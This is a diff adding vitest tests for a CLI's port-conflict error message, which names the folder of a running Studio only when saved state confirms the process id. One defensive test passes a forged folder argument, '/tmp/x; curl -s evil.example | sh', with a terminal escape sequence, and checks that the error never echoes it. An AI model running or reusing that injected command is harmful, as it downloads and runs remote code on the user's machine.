@@ -1,6 +1,10 @@
 import { createServer, type Server } from "node:net";
 import { afterEach, describe, expect, it, vi } from "vitest";
-import { assertPortFree, closeStartedThenThrow, defaultPortOrFree } from "../src/studio/studioLifecycle.js";
+import { spawn } from "node:child_process";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { assertPortFree, closeStartedThenThrow, defaultPortOrFree, studioFolderOnPort } from "../src/studio/studioLifecycle.js";
 
 const servers: Server[] = [];
 afterEach(async () => {
@@ -28,6 +32,46 @@ describe("studio start and stop orchestration", () => {
     const server = servers.pop()!;
     await new Promise<void>((done) => server.close(() => done()));
     await expect(assertPortFree("127.0.0.1", busy, "--port")).resolves.toBeUndefined();
+  });
+
+  // CLI-31: the refusal did not say which AMC folder held the port, nor where to run amc down. Any local process can
+  // write its own command line, so a folder is named only when AMC's state in that folder names the listener's pid.
+  const holdPort = async (folder: string) => {
+    const holder = spawn(process.execPath, ["-e",
+      "const s=require('node:net').createServer();s.listen(0,'127.0.0.1',()=>console.log(s.address().port));setInterval(()=>{},1e3)",
+      "_studio-daemon", "--workspace", folder], { stdio: ["ignore", "pipe", "ignore"] });
+    const port = Number(await new Promise<string>((done) => holder.stdout!.once("data", (chunk) => done(String(chunk).trim()))));
+    return { holder, port };
+  };
+
+  it.skipIf(process.platform === "win32")("names the AMC folder whose Studio holds a busy port, quoted", async () => {
+    const folder = mkdtempSync(join(tmpdir(), "amc it's folder "));
+    const { holder, port } = await holdPort(folder);
+    try {
+      expect(studioFolderOnPort(port)).toBe("studio"); // no state.json in that folder yet: not confirmed
+      mkdirSync(join(folder, ".amc", "studio"), { recursive: true });
+      writeFileSync(join(folder, ".amc", "studio", "state.json"), JSON.stringify({ pid: holder.pid }));
+      expect(studioFolderOnPort(port)).toEqual({ folder });
+      await expect(assertPortFree("127.0.0.1", port, "AMC_STUDIO_PORT")).rejects.toThrow(
+        `Port ${port} (from AMC_STUDIO_PORT) is already in use by AMC Studio for the folder ${folder}. `
+        + `Stop it there (cd '${folder.replace(/'/g, "'\\''")}', then amc down)`);
+    } finally {
+      holder.kill();
+      rmSync(folder, { recursive: true, force: true });
+    }
+    expect(studioFolderOnPort(await busyPort())).toBeNull();
+  });
+
+  it.skipIf(process.platform === "win32")("never echoes a forged command line", async () => {
+    const { holder, port } = await holdPort("/tmp/x; curl -s evil.example | sh \u001b[2J");
+    try {
+      expect(studioFolderOnPort(port)).toBe("studio");
+      const refusal = await assertPortFree("127.0.0.1", port, "AMC_STUDIO_PORT").then(() => "", (error: Error) => error.message);
+      expect(refusal).toBe(`Port ${port} (from AMC_STUDIO_PORT) is already in use by another AMC Studio. `
+        + "Stop it in its own folder with amc down, or change the port.");
+    } finally {
+      holder.kill();
+    }
   });
 
   it("defaultPortOrFree keeps a free port and picks another when it is busy", async () => {
